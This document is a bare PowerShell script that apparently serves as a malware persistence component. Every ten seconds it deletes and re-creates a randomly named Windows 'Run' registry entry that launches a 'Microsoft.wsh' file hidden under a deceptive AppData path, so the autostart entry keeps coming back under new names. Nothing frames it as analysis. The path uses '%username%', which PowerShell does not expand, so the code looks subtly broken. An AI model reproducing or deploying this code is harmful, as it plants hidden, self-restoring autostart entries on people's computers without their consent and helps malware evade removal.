$loop = 1
While ($loop = $loop)
{
    Timeout /T 10
    cls
    try { 
       $Obj = Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name *0
       if ($null -eq $Obj) {
           throw
       }else{
            Remove-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -name *0
            $random = Get-Random
            $0 = 0
            $random = "$random" + $0
            New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $random -Value C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\Microsoft.wsh
		}
       }
    catch {
       $random = Get-Random
       $0 = 0
       $random = "$random" + $0
       New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $random -Value C:\Users\%username%\AppData\Local\Microsoft\Windows\Shell\bin\7498\NUL\U_T_E\Microsoft.wsh
    }
}
